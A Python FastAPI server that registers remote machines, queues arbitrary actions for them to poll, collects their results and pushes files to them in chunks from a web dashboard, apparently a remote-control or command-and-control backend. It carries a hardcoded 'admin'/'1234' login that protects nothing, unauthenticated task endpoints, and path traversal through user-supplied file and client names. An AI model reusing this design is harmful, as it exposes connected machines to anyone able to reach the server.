from fastapi import FastAPI, UploadFile, File, Form
from fastapi.responses import HTMLResponse
import os, time, shutil

app = FastAPI()

clients = {}
tasks = {}
results = {}

UPLOAD_DIR = "uploads"
os.makedirs(UPLOAD_DIR, exist_ok=True)

# -------- LOGIN --------
users = {"admin": "1234"}

@app.post("/login")
def login(username: str = Form(...), password: str = Form(...)):
    if users.get(username) == password:
        return {"status": "success"}
    return {"status": "fail"}

# -------- REGISTER --------
@app.post("/register")
def register(system_id: str = Form(...)):
    clients[system_id] = time.time()
    return {"status": "ok"}

@app.get("/clients")
def get_clients():
    now = time.time()
    return {cid: "online" for cid, t in clients.items() if now - t < 15}

# -------- FILE CHUNK UPLOAD --------
@app.post("/upload_chunk")
async def upload_chunk(system_id: str = Form(...), filename: str = Form(...), chunk_id: int = Form(...), file: UploadFile = File(...)):
    folder = f"{UPLOAD_DIR}/{system_id}_{filename}"
    os.makedirs(folder, exist_ok=True)

    with open(f"{folder}/{chunk_id}.part", "wb") as f:
        f.write(await file.read())

    return {"status": "ok"}

@app.post("/complete")
def complete(system_id: str = Form(...), filename: str = Form(...), total_chunks: int = Form(...)):
    tasks[system_id] = {
        "action": "assemble",
        "filename": filename,
        "total": total_chunks
    }
    return {"status": "done"}

# -------- TASK SYSTEM --------
@app.post("/task")
def create_task(system_id: str = Form(...), action: str = Form(...), path: str = Form("")):
    tasks[system_id] = {"action": action, "path": path}
    return {"status": "task added"}

@app.get("/task/{system_id}")
def get_task(system_id: str):
    return tasks.pop(system_id, {"action": None})

@app.post("/result")
def save_result(system_id: str = Form(...), data: str = Form(...)):
    results[system_id] = data
    return {"status": "saved"}

@app.get("/result/{system_id}")
def get_result(system_id: str):
    return results.pop(system_id, {})

# -------- DASHBOARD --------
@app.get("/dashboard", response_class=HTMLResponse)
def dashboard():
    return """
    <html>
    <body>
    <h2>Clients</h2>
    <ul id='list'></ul>

    <script>
    async function load(){
        let res = await fetch('/clients');
        let data = await res.json();
        let ul = document.getElementById("list");
        ul.innerHTML="";

        for (let c in data){
            let li = document.createElement("li");
            li.innerText = c;

            let btn = document.createElement("button");
            btn.innerText = "Send File";
            btn.onclick = ()=>sendFile(c);

            li.appendChild(btn);
            ul.appendChild(li);
        }
    }

    async function sendFile(client){
        let input = document.createElement('input');
        input.type='file';

        input.onchange = async e=>{
            let file = e.target.files[0];
            let chunkSize = 1024*1024;
            let total = Math.ceil(file.size/chunkSize);

            for(let i=0;i<total;i++){
                let chunk = file.slice(i*chunkSize,(i+1)*chunkSize);
                let form = new FormData();

                form.append("system_id",client);
                form.append("filename",file.name);
                form.append("chunk_id",i);
                form.append("file",chunk);

                await fetch('/upload_chunk',{method:'POST',body:form});
            }

            await fetch('/complete',{
                method:'POST',
                body:new URLSearchParams({
                    system_id:client,
                    filename:file.name,
                    total_chunks:total
                })
            });

            alert("File Sent");
        };

        input.click();
    }

    setInterval(load,3000);
    load();
    </script>
    </body>
    </html>
    """
